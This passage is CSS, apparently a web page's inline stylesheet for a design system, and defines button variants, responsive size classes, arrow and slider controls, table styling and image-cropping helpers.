            word-wrap: break-word
        }

        [data-sparta-container] .nowrap code,
        [data-sparta-container] .nowrap samp {
            white-space: nowrap
        }

        [data-sparta-container] table {
            background: none
        }

        [data-sparta-container] img {
            border: 0 none
        }

        [data-sparta-container] sup,
        [data-sparta-container] sub {
            line-height: 0
        }

        [data-sparta-container] h1 sup a[data-footnote],
        [data-sparta-container] h2 sup a[data-footnote],
        [data-sparta-container] h3 sup a[data-footnote],
        [data-sparta-container] h4 sup a[data-footnote] {
            font-size: 75%
        }

        [data-sparta-container] form {
            margin: 0;
            padding: 0
        }

        [data-sparta-container] input {
            margin: 0 !important
        }

        [data-sparta-container] fieldset {
            margin: 0;
            padding: 0;
            width: auto;
            overflow: hidden;
            border: 0
        }

        [data-sparta-container] ul,
        [data-sparta-container] ol,
        [data-sparta-container] dl {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit
        }

        [data-sparta-container] ul.gray-sq-bullet li {
            list-style-position: inside;
            list-style-type: square
        }

        [data-sparta-container] a:visited {
            color: #0052C2
        }

        [data-sparta-container] picture {
            width: 100%
        }

        [data-sparta-container] picture>source,
        [data-sparta-container] picture>img {
            display: block;
            width: 100%
        }

        [data-sparta-container] .spa-btn {
            display: inline-block;
            font-family: "cnx-regular", Arial, Helvetica, sans-serif;
            font-weight: normal;
            line-height: 1;
            text-align: center;
            text-decoration: none;
            vertical-align: middle;
            position: relative;
            margin: 0;
            border-radius: 0;
            border: none;
            outline: none;
            cursor: pointer;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s
        }

        [data-sparta-container] .spa-btn:hover {
            text-decoration: none
        }

        [data-sparta-container] .spa-btn--primary {
            color: #fff;
            background-color: #0073CF
        }

        [data-sparta-container] .spa-btn--primary:visited {
            color: #fff
        }

        [data-sparta-container] .spa-btn--primary:hover,
        [data-sparta-container] .spa-btn--primary:focus {
            color: #fff;
            background: #0052C2
        }

        [data-sparta-container] .spa-btn--secondary {
            color: #0052C2;
            background-color: #F2F2F2
        }

        [data-sparta-container] .spa-btn--secondary:visited {
            color: #0052C2
        }

        [data-sparta-container] .spa-btn--secondary:hover,
        [data-sparta-container] .spa-btn--secondary:focus {
            color: #012169;
            background: #E3E3E3
        }

        [data-sparta-container] .spa-btn--reverse {
            color: #0073CF;
            background-color: #fff
        }

        [data-sparta-container] .spa-btn--reverse:visited {
            color: #0073CF
        }

        [data-sparta-container] .spa-btn--reverse:hover,
        [data-sparta-container] .spa-btn--reverse:focus {
            color: #012169;
            background: #fff
        }

        [data-sparta-container] .spa-btn--white-border {
            color: #fff;
            background-color: rgba(0, 0, 0, 0);
            border: 2px solid #fff
        }

        [data-sparta-container] .spa-btn--white-border:visited {
            color: #fff
        }

        [data-sparta-container] .spa-btn--white-border:hover,
        [data-sparta-container] .spa-btn--white-border:focus {
            color: #0052C2;
            background: #fff
        }

        [data-sparta-container] .spa-btn--red-border {
            color: #DC1431;
            background-color: rgba(0, 0, 0, 0);
            border: 2px solid #DC1431
        }

        [data-sparta-container] .spa-btn--red-border:visited {
            color: #DC1431
        }

        [data-sparta-container] .spa-btn--red-border:hover,
        [data-sparta-container] .spa-btn--red-border:focus {
            color: #fff;
            background: #DC1431
        }

        [data-sparta-container] .spa-btn--blue-border {
            color: #0073CF;
            background-color: rgba(0, 0, 0, 0);
            border: 2px solid #0073CF
        }

        [data-sparta-container] .spa-btn--blue-border:visited {
            color: #0073CF
        }

        [data-sparta-container] .spa-btn--blue-border:hover,
        [data-sparta-container] .spa-btn--blue-border:focus {
            color: #fff;
            background: #0073CF
        }

        [data-sparta-container] .spa-btn--link {
            color: #0052C2;
            background-color: rgba(0, 0, 0, 0)
        }

        [data-sparta-container] .spa-btn--link:visited {
            color: #0052C2
        }

        [data-sparta-container] .spa-btn--link:hover,
        [data-sparta-container] .spa-btn--link:focus {
            color: #012169;
            background: rgba(0, 0, 0, 0)
        }

        [data-sparta-container] .spa-btn--link:hover,
        [data-sparta-container] .spa-btn--link:focus {
            text-decoration: underline
        }

        [data-sparta-container] .spa-btn[disabled],
        [data-sparta-container] .spa-btn--disabled {
            color: #A8A8A8;
            background-color: #F2F2F2;
            pointer-events: none
        }

        [data-sparta-container] .spa-btn[disabled]:visited,
        [data-sparta-container] .spa-btn--disabled:visited {
            color: #A8A8A8
        }

        [data-sparta-container] .spa-btn[disabled]:hover,
        [data-sparta-container] .spa-btn[disabled]:focus,
        [data-sparta-container] .spa-btn--disabled:hover,
        [data-sparta-container] .spa-btn--disabled:focus {
            color: #A8A8A8;
            background: #F2F2F2
        }

        [data-sparta-container] .spa-btn[disabled].spa-btn--reverse,
        [data-sparta-container] .spa-btn--disabled.spa-btn--reverse {
            color: #A8A8A8;
            background-color: #fff
        }

        [data-sparta-container] .spa-btn[disabled].spa-btn--reverse:visited,
        [data-sparta-container] .spa-btn--disabled.spa-btn--reverse:visited {
            color: #A8A8A8
        }

        [data-sparta-container] .spa-btn[disabled].spa-btn--reverse:hover,
        [data-sparta-container] .spa-btn[disabled].spa-btn--reverse:focus,
        [data-sparta-container] .spa-btn--disabled.spa-btn--reverse:hover,
        [data-sparta-container] .spa-btn--disabled.spa-btn--reverse:focus {
            color: #A8A8A8;
            background: #fff
        }

        [data-sparta-container] .spa-btn[disabled].spa-btn--link,
        [data-sparta-container] .spa-btn--disabled.spa-btn--link {
            background-color: rgba(0, 0, 0, 0)
        }

        [data-sparta-container] .spa-btn--small {
            font-size: 16px;
            padding: 7px 15px
        }

        [data-sparta-container] .spa-btn--medium {
            font-size: 20px;
            padding: 10px 20px
        }

        [data-sparta-container] .spa-btn--large {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        [data-sparta-container] .spa-btn--engagement {
            font-size: 32px;
            padding: 14px 30px
        }

        [data-sparta-container] .spa-btn--block {
            display: block;
            width: 100%
        }

        [data-sparta-container] .spa-btn--white-border.spa-btn--small {
            padding-top: 5px;
            padding-bottom: 5px
        }

        [data-sparta-container] .spa-btn--white-border.spa-btn--medium {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--white-border.spa-btn--large {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--white-border.spa-btn--engagement {
            padding-top: 12px;
            padding-bottom: 12px
        }

        [data-sparta-container] .spa-btn--red-border.spa-btn--small {
            padding-top: 5px;
            padding-bottom: 5px
        }

        [data-sparta-container] .spa-btn--red-border.spa-btn--medium {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--red-border.spa-btn--large {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--red-border.spa-btn--engagement {
            padding-top: 12px;
            padding-bottom: 12px
        }

        [data-sparta-container] .spa-btn--blue-border.spa-btn--small {
            padding-top: 5px;
            padding-bottom: 5px
        }

        [data-sparta-container] .spa-btn--blue-border.spa-btn--medium {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--blue-border.spa-btn--large {
            padding-top: 8px;
            padding-bottom: 8px
        }

        [data-sparta-container] .spa-btn--blue-border.spa-btn--engagement {
            padding-top: 12px;
            padding-bottom: 12px
        }

        [data-sparta-container] .spa-btn--link {
            padding: 0
        }

        [data-sparta-container] .spa-btn--contrast {
            background-color: #DC1431;
            color: #fff
        }

        [data-sparta-container] .spa-btn--contrast:visited {
            color: #fff
        }

        [data-sparta-container] .spa-btn--contrast:hover,
        [data-sparta-container] .spa-btn--contrast:focus {
            background: #C41230;
            color: #fff
        }

        [data-sparta-container] .spa-btn--expand-on-small {
            width: 100%;
            display: block
        }

        [data-sparta-container] .spa-btn--expand-on-medium {
            width: 100%;
            display: block
        }

        .medium-up [data-sparta-container] .spa-btn--expand-on-small {
            width: auto;
            display: inline-block
        }

        .large-up [data-sparta-container] .spa-btn--expand-on-medium {
            width: auto;
            display: inline-block
        }

        [data-sparta-container] .spa-btn-group .spa-btn {
            margin-right: 10px;
            margin-bottom: 15px
        }

        [data-sparta-container] .spa-btn-group .spa-btn--small {
            margin-right: 5px
        }

        [data-sparta-container] .spa-input-btn-group .spa-input-btn-column .spa-btn--medium {
            margin-top: 21px;
            margin-right: 10px
        }

        [data-sparta-container] .svg-button:focus {
            outline: 1px dotted #857363
        }

        [data-sparta-container] .svg-button--dark-bg:focus {
            outline-color: #fff
        }

        @media only screen and (min-width: 320px) {
            [data-sparta-container] .spa-btn--small-at-small-up {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-small-up {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-small-up {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-small-up {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-small-up {
                display: block;
                width: 100%
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-btn--small-at-medium-up {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-medium-up {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-medium-up {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-medium-up {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-medium-up {
                display: block;
                width: 100%
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .spa-btn--small-at-large-up {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-large-up {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-large-up {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-large-up {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-large-up {
                display: block;
                width: 100%
            }
        }

        @media (max-width: 767px) {
            [data-sparta-container] .spa-btn--small-at-small-only {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-small-only {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-small-only {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-small-only {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-small-only {
                display: block;
                width: 100%
            }
        }

        @media only screen and (min-width: 768px) and (max-width: 1024px) {
            [data-sparta-container] .spa-btn--small-at-medium-only {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-medium-only {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-medium-only {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-medium-only {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-medium-only {
                display: block;
                width: 100%
            }
        }

        @media (min-width: 1025px) {
            [data-sparta-container] .spa-btn--small-at-large-only {
                font-size: 16px;
                padding: 7px 15px
            }

            [data-sparta-container] .spa-btn--medium-at-large-only {
                font-size: 20px;
                padding: 10px 20px
            }

            [data-sparta-container] .spa-btn--large-at-large-only {
                font-size: 24px;
                line-height: 25px;
                padding: 10px 25px
            }

            [data-sparta-container] .spa-btn--engagement-at-large-only {
                font-size: 32px;
                padding: 14px 30px
            }

            [data-sparta-container] .spa-btn--block-at-large-only {
                display: block;
                width: 100%
            }
        }

        .small-up .spa-btn--small-at-small-up {
            font-size: 16px;
            padding: 7px 15px
        }

        .small-up .spa-btn--medium-at-small-up {
            font-size: 20px;
            padding: 10px 20px
        }

        .small-up .spa-btn--large-at-small-up {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .small-up .spa-btn--engagement-at-small-up {
            font-size: 32px;
            padding: 14px 30px
        }

        .small-up .spa-btn--block-at-small-up {
            display: block;
            width: 100%
        }

        .medium-up .spa-btn--small-at-medium-up {
            font-size: 16px;
            padding: 7px 15px
        }

        .medium-up .spa-btn--medium-at-medium-up {
            font-size: 20px;
            padding: 10px 20px
        }

        .medium-up .spa-btn--large-at-medium-up {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .medium-up .spa-btn--engagement-at-medium-up {
            font-size: 32px;
            padding: 14px 30px
        }

        .medium-up .spa-btn--block-at-medium-up {
            display: block;
            width: 100%
        }

        .large-up .spa-btn--small-at-large-up {
            font-size: 16px;
            padding: 7px 15px
        }

        .large-up .spa-btn--medium-at-large-up {
            font-size: 20px;
            padding: 10px 20px
        }

        .large-up .spa-btn--large-at-large-up {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .large-up .spa-btn--engagement-at-large-up {
            font-size: 32px;
            padding: 14px 30px
        }

        .large-up .spa-btn--block-at-large-up {
            display: block;
            width: 100%
        }

        .small-only .spa-btn--small-at-small-only {
            font-size: 16px;
            padding: 7px 15px
        }

        .small-only .spa-btn--medium-at-small-only {
            font-size: 20px;
            padding: 10px 20px
        }

        .small-only .spa-btn--large-at-small-only {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .small-only .spa-btn--engagement-at-small-only {
            font-size: 32px;
            padding: 14px 30px
        }

        .small-only .spa-btn--block-at-small-only {
            display: block;
            width: 100%
        }

        .medium-only .spa-btn--small-at-medium-only {
            font-size: 16px;
            padding: 7px 15px
        }

        .medium-only .spa-btn--medium-at-medium-only {
            font-size: 20px;
            padding: 10px 20px
        }

        .medium-only .spa-btn--large-at-medium-only {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .medium-only .spa-btn--engagement-at-medium-only {
            font-size: 32px;
            padding: 14px 30px
        }

        .medium-only .spa-btn--block-at-medium-only {
            display: block;
            width: 100%
        }

        .large-only .spa-btn--small-at-large-only {
            font-size: 16px;
            padding: 7px 15px
        }

        .large-only .spa-btn--medium-at-large-only {
            font-size: 20px;
            padding: 10px 20px
        }

        .large-only .spa-btn--large-at-large-only {
            font-size: 24px;
            line-height: 25px;
            padding: 10px 25px
        }

        .large-only .spa-btn--engagement-at-large-only {
            font-size: 32px;
            padding: 14px 30px
        }

        .large-only .spa-btn--block-at-large-only {
            display: block;
            width: 100%
        }

        [data-sparta-container] .spa-right-rail-module {
            width: 100%;
            height: auto;
            padding: 10px 15px;
            margin-bottom: 15px;
            color: #666;
            font: normal normal normal 14px/18px Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .spa-right-rail-module--primary {
            background: #DC1431;
            color: #fff;
            padding: 20px 15px
        }

        [data-sparta-container] .spa-right-rail-module--secondary {
            background: #ECE6DD
        }

        [data-sparta-container] .spa-right-rail-module--outline {
            border: 1px solid #ECE6DD
        }

        [data-sparta-container] .spa-right-rail-module-heading {
            font-size: 22px;
            margin-top: 0;
            margin-bottom: 20px
        }

        [data-sparta-container] .spa-right-rail-module--primary .spa-right-rail-module-heading {
            font-size: 24px;
            color: #fff
        }

        [data-sparta-container] .spa-right-rail-module p,
        [data-sparta-container] .spa-right-rail-module ul,
        [data-sparta-container] .spa-right-rail-module ol,
        [data-sparta-container] .spa-right-rail-module a {
            font: normal normal normal 14px/18px Arial, Helvetica, sans-serif;
            margin-bottom: 10px
        }

        [data-sparta-container] .spa-right-rail-module img {
            width: 100%;
            height: auto;
            margin-bottom: 10px
        }

        [data-sparta-container] .spa-arrow-container {
            width: 100%;
            position: relative;
            z-index: 200
        }

        [data-sparta-container] .spa-arrow-btn {
            position: relative;
            border: none;
            background: transparent;
            font-size: 0;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s;
            transform-origin: center center;
            -webkit-transform-origin: center center;
            z-index: 1
        }

        [data-sparta-container] .spa-arrow-btn:before,
        [data-sparta-container] .spa-arrow-btn:after {
            content: '';
            width: 2px;
            height: 8px;
            position: absolute;
            background: #666;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s;
            z-index: 3
        }

        [data-sparta-container] .spa-arrow-btn:hover,
        [data-sparta-container] .spa-arrow-btn:focus {
            background: transparent;
            outline: none
        }

        [data-sparta-container] .spa-arrow-btn:hover:before,
        [data-sparta-container] .spa-arrow-btn:hover:after,
        [data-sparta-container] .spa-arrow-btn:focus:before,
        [data-sparta-container] .spa-arrow-btn:focus:after {
            background: #ccc
        }

        [data-sparta-container] .spa-arrow-btn--left {
            left: 0;
            position: absolute;
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        [data-sparta-container] .spa-arrow-btn--left:before,
        [data-sparta-container] .spa-arrow-btn--left:after {
            left: 7px
        }

        [data-sparta-container] .spa-arrow-btn--left:before {
            top: 0;
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg)
        }

        [data-sparta-container] .spa-arrow-btn--left:after {
            top: 6.5px;
            transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg)
        }

        [data-sparta-container] .spa-arrow-btn--right {
            right: 0;
            position: absolute;
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        [data-sparta-container] .spa-arrow-btn--right:before,
        [data-sparta-container] .spa-arrow-btn--right:after {
            right: 7px
        }

        [data-sparta-container] .spa-arrow-btn--right:before {
            top: 0;
            transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg)
        }

        [data-sparta-container] .spa-arrow-btn--right:after {
            top: 6.5px;
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg)
        }

        [data-sparta-container] .spa-arrow-btn--learn-more {
            width: 20px;
            height: 20px;
            padding: 0;
            margin: 0;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s;
            transform: none;
            -webkit-transform: none
        }

        [data-sparta-container] .spa-arrow-btn--learn-more:before,
        [data-sparta-container] .spa-arrow-btn--learn-more:after {
            right: 8px
        }

        [data-sparta-container] .spa-arrow-btn--learn-more:before {
            top: 4px;
            transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg)
        }

        [data-sparta-container] .spa-arrow-btn--learn-more:after {
            top: 8px;
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg)
        }

        [data-sparta-container] .spa-arrow-btn--learn-more.active {
            transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        [data-sparta-container] .spa-arrow-btn--learn-more.active:before,
        [data-sparta-container] .spa-arrow-btn--learn-more.active:after {
            right: 9px
        }

        [data-sparta-container] .spa-arrow-btn--toggle {
            display: inline-block;
            margin-right: 10px;
            position: relative;
            height: 20px;
            width: 20px
        }

        [data-sparta-container] .spa-arrow-btn--toggle .spa-arrow-btn--learn-more {
            top: 0
        }

        [data-sparta-container] .spa-arrow-btn--large {
            padding: 15px
        }

        [data-sparta-container] .spa-arrow-btn--large:before,
        [data-sparta-container] .spa-arrow-btn--large:after {
            width: 5px;
            height: 19px
        }

        [data-sparta-container] .spa-arrow-btn--large.spa-arrow-btn--left:before {
            top: 0
        }

        [data-sparta-container] .spa-arrow-btn--large.spa-arrow-btn--left:after {
            top: 10px
        }

        [data-sparta-container] .spa-arrow-btn--large.spa-arrow-btn--right:before {
            top: 0
        }

        [data-sparta-container] .spa-arrow-btn--large.spa-arrow-btn--right:after {
            top: 10px
        }

        [data-sparta-container] .spa-arrow-btn--blue:hover:before,
        [data-sparta-container] .spa-arrow-btn--blue:hover:after,
        [data-sparta-container] .spa-arrow-btn--blue:focus:before,
        [data-sparta-container] .spa-arrow-btn--blue:focus:after {
            background: #012169
        }

        [data-sparta-container] .spa-arrow-btn--blue:before,
        [data-sparta-container] .spa-arrow-btn--blue:after {
            background: #0073CF
        }

        [data-sparta-container] .spa-arrow-btn--red:hover:before,
        [data-sparta-container] .spa-arrow-btn--red:hover:after,
        [data-sparta-container] .spa-arrow-btn--red:focus:before,
        [data-sparta-container] .spa-arrow-btn--red:focus:after {
            background: #ccc
        }

        [data-sparta-container] .spa-arrow-btn--red:before,
        [data-sparta-container] .spa-arrow-btn--red:after {
            background: #DC1431
        }

        [data-sparta-container] .spa-arrow-btn--disabled:hover:before,
        [data-sparta-container] .spa-arrow-btn--disabled:hover:after,
        [data-sparta-container] .spa-arrow-btn--disabled:focus:before,
        [data-sparta-container] .spa-arrow-btn--disabled:focus:after,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:hover:before,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:hover:after,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:focus:before,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:focus:after {
            background: #ece6dd
        }

        [data-sparta-container] .spa-arrow-btn--disabled:before,
        [data-sparta-container] .spa-arrow-btn--disabled:after,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:before,
        [data-sparta-container] .spa-arrow-btn.slick-disabled:after {
            background: #ece6dd
        }

        [data-sparta-applicataion] .spa-slider-circle-btn {
            width: 12px;
            height: 12px;
            display: inline-block;
            position: relative;
            padding: 0;
            border: none;
            margin: 0 5px;
            background: #d1c9c0;
            font-size: 0;
            border-radius: 6px;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s
        }

        [data-sparta-applicataion] .spa-slider-circle-btn:hover,
        [data-sparta-applicataion] .spa-slider-circle-btn:focus {
            background-color: #A29282
        }

        [data-sparta-applicataion] .slick-active .spa-slider-circle-btn,
        [data-sparta-applicataion] .slick-active .spa-slider-circle-btn:hover,
        [data-sparta-applicataion] .slick-active .spa-slider-circle-btn:focus {
            background-color: #DC1431
        }

        [data-sparta-container] .spa-table {
            width: 100%;
            margin-top: 0;
            border-collapse: collapse
        }

        [data-sparta-container] .spa-table-container {
            width: 100%
        }

        [data-sparta-container] .spa-table-header {
            width: 100%;
            padding: 10px;
            margin: 0;
            color: #fff;
            background: #DC1431;
            font-family: "cnx-bold";
            font-size: 16px;
            font-weight: normal
        }

        [data-sparta-container] .spa-table-header--secondary {
            color: #6b5e51;
            background: transparent;
            border-bottom: 1px solid #ece6dd
        }

        [data-sparta-container] .spa-table table {
            background: #fff;
            border: solid 1px #ddd;
            margin-bottom: 1.25rem;
            table-layout: auto;
            border-collapse: collapse;
            border-spacing: 0
        }

        [data-sparta-container] .spa-table table td,
        [data-sparta-container] .spa-table table th {
            border: none
        }

        [data-sparta-container] .spa-table table thead th {
            background: #f5f5f5;
            color: #333;
            font-size: 14px;
            font-weight: bold;
            line-height: 1.125rem;
            padding: .5rem .625rem .625rem
        }

        [data-sparta-container] .spa-table table>tfoot>tr {
            background: #ece6dd
        }

        [data-sparta-container] .spa-table table>tfoot>th {
            color: #333;
            font-size: 16px;
            font-weight: bold;
            display: table-cell;
            line-height: 1.125rem
        }

        [data-sparta-container] .spa-table table tr {
            height: 40px;
            padding: 15px 10px
        }

        [data-sparta-container] .spa-table table tr>td {
            color: #333;
            font-size: 14px
        }

        [data-sparta-container] .spa-table table tr:nth-child(even) {
            background: #f9f7f4
        }

        [data-sparta-container] .spa-table table tr:nth-child(odd) {
            background: #fff
        }

        [data-sparta-container] .spa-guillemet:after,
        [data-sparta-container] .spa-guillemet:before {
            font-size: 1.2em
        }

        [data-sparta-container] .spa-guillemet:after {
            content: ' \00BB'
        }

        [data-sparta-container] .spa-guillemet--left:after {
            content: ''
        }

        [data-sparta-container] .spa-guillemet--left:before {
            content: '\00AB  '
        }

        [data-sparta-container] .picture-box {
            overflow: hidden;
            position: relative
        }

        @media (min-width: 1920px) {
            [data-sparta-container] .picture-box {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center
            }
        }

        [data-sparta-container] .picture-box>picture {
            z-index: 0;
            display: table;
            position: absolute;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%);
            width: auto
        }

        [data-sparta-container] .picture-box>picture>img {
            width: auto;
            max-width: 1920px
        }

        [data-sparta-container] .picture-box.crop-from-left picture {
            position: absolute;
            left: auto;
            right: 0;
            -webkit-transform: none;
            transform: none
        }

        @media (min-width: 1920px) {
            [data-sparta-container] .picture-box.crop-from-left picture {
                position: relative
            }
        }

        @media (max-width: 767px) {
            [data-sparta-container] .picture-box.crop-small-from-left picture {
                position: absolute;
                left: auto;
                right: 0;
                -webkit-transform: none;
                transform: none
            }
        }

        @media only screen and (min-width: 768px) and (max-width: 1024px) {
            [data-sparta-container] .picture-box.crop-medium-from-left picture {
                position: absolute;
                left: auto;
                right: 0;
                -webkit-transform: none;
                transform: none
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .picture-box.crop-large-from-left picture {
                position: absolute;
                left: auto;
                right: 0;
                -webkit-transform: none;
                transform: none
            }
        }

        @media (min-width: 1920px) {
            [data-sparta-container] .picture-box.crop-large-from-left picture {
                position: relative
            }
        }

        [data-sparta-container] .picture-box.crop-from-right picture {
            position: absolute;
            left: 0;
            right: auto;
            -webkit-transform: none;
            transform: none
        }

        @media (min-width: 1920px) {
            [data-sparta-container] .picture-box.crop-from-right picture {
                position: relative
            }
        }

        @media (max-width: 767px) {
            [data-sparta-container] .picture-box.crop-small-from-right picture {
                position: absolute;
                left: 0;
                right: auto;
                -webkit-transform: none;
                transform: none
            }
        }

        @media only screen and (min-width: 768px) and (max-width: 1024px) {
            [data-sparta-container] .picture-box.crop-medium-from-right picture {
                position: absolute;
                left: 0;
                right: auto;
                -webkit-transform: none;
                transform: none
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .picture-box.crop-large-from-right picture {
                position: absolute;
                left: 0;
                right: auto;
                -webkit-transform: none;
                transform: none
            }
        }

        @media (min-width: 1920px) {
            [data-sparta-container] .picture-box.crop-large-from-right picture {
                position: relative
            }
        }

        [data-sparta-container] .picture-box .picture-box__content {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%
        }

        [data-sparta-container] .full-width-row .picture-fader:before,
        [data-sparta-container] .full-width-row .picture-fader:after {
            z-index: 1;
            content: '';
            position: absolute;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%);
            width: 60px;
            height: 100%;
            box-sizing: border-box
        }

        [data-sparta-container] .full-width-row .picture-fader:before {
            background-image: -webkit-linear-gradient(left, #fff 0%, rgba(255, 255, 255, 0.738) 19%, rgba(255, 255, 255, 0.541) 34%, rgba(255, 255, 255, 0.382) 47%, rgba(255, 255, 255, 0.278) 56.5%, rgba(255, 255, 255, 0.194) 65%, rgba(255, 255, 255, 0.126) 73%, rgba(255, 255, 255, 0.075) 80.2%, rgba(255, 255, 255, 0.042) 86.1%, rgba(255, 255, 255, 0.021) 91%, rgba(255, 255, 255, 0.008) 95.2%, rgba(255, 255, 255, 0.002) 98.2%, rgba(255, 255, 255, 0) 100%);
            background-image: linear-gradient(to right, #fff 0%, rgba(255, 255, 255, 0.738) 19%, rgba(255, 255, 255, 0.541) 34%, rgba(255, 255, 255, 0.382) 47%, rgba(255, 255, 255, 0.278) 56.5%, rgba(255, 255, 255, 0.194) 65%, rgba(255, 255, 255, 0.126) 73%, rgba(255, 255, 255, 0.075) 80.2%, rgba(255, 255, 255, 0.042) 86.1%, rgba(255, 255, 255, 0.021) 91%, rgba(255, 255, 255, 0.008) 95.2%, rgba(255, 255, 255, 0.002) 98.2%, rgba(255, 255, 255, 0) 100%);
            margin-left: -932px
        }

        [data-sparta-container] .full-width-row .picture-fader:after {
            background-image: -webkit-linear-gradient(right, #fff 0%, rgba(255, 255, 255, 0.738) 19%, rgba(255, 255, 255, 0.541) 34%, rgba(255, 255, 255, 0.382) 47%, rgba(255, 255, 255, 0.278) 56.5%, rgba(255, 255, 255, 0.194) 65%, rgba(255, 255, 255, 0.126) 73%, rgba(255, 255, 255, 0.075) 80.2%, rgba(255, 255, 255, 0.042) 86.1%, rgba(255, 255, 255, 0.021) 91%, rgba(255, 255, 255, 0.008) 95.2%, rgba(255, 255, 255, 0.002) 98.2%, rgba(255, 255, 255, 0) 100%);
            background-image: linear-gradient(to left, #fff 0%, rgba(255, 255, 255, 0.738) 19%, rgba(255, 255, 255, 0.541) 34%, rgba(255, 255, 255, 0.382) 47%, rgba(255, 255, 255, 0.278) 56.5%, rgba(255, 255, 255, 0.194) 65%, rgba(255, 255, 255, 0.126) 73%, rgba(255, 255, 255, 0.075) 80.2%, rgba(255, 255, 255, 0.042) 86.1%, rgba(255, 255, 255, 0.021) 91%, rgba(255, 255, 255, 0.008) 95.2%, rgba(255, 255, 255, 0.002) 98.2%, rgba(255, 255, 255, 0) 100%);
            margin-left: 932px
        }

        [data-sparta-container] .spa-center {
            -webkit-transform-style: preserve-3d;
            transform-style: preserve-3d;
            position: relative;
            width: 100%;
            height: 100%
        }

        [data-sparta-container] .spa-center-absolutely {
            position: absolute;
            top: 50%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        [data-sparta-container] .spa-center-vertically {
            position: absolute;
            top: 50%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        [data-sparta-container] .spa-center-horizontally--block {
            margin-left: auto;
            margin-right: auto
        }

        [data-sparta-container] .spa-center-horizontally--force {
            position: absolute;
            left: 50%;
            -webkit-transform: translateX(-50%);
            transform: translateX(-50%)
        }

        [data-sparta-container] #ada-skip-link.ada-visible-focus {
            display: block;
            font: 14px/18px Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif;
            height: 20px;
            width: 200px;
            position: absolute;
            -webkit-transition: top 1s ease-out 0s, background 1s linear 0s;
